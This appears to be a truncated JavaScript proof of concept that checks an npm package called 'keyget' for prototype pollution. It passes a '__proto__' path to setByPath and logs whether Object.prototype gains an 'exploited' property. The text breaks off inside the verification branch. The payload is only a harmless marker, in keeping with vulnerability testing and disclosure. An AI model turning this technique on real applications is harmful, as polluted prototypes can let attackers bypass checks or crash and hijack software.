```js
async function exploit() {
  const keyget = require('keyget');

  // Ensure a clean state before testing
  delete Object.prototype.exploited;

  // trigger prototype pollution by targeting __proto__ through setByPath
  keyget.setByPath({}, ['__proto__', 'exploited'], true);

  // verify that the property now exists on the prototype chain
  if (Object.hasOwn(Object.prototype, 'exploited')) {
    console.log('[+] Prototype pollution confirmed: Object.prototype.exploited is', Object.prototype.exploited);
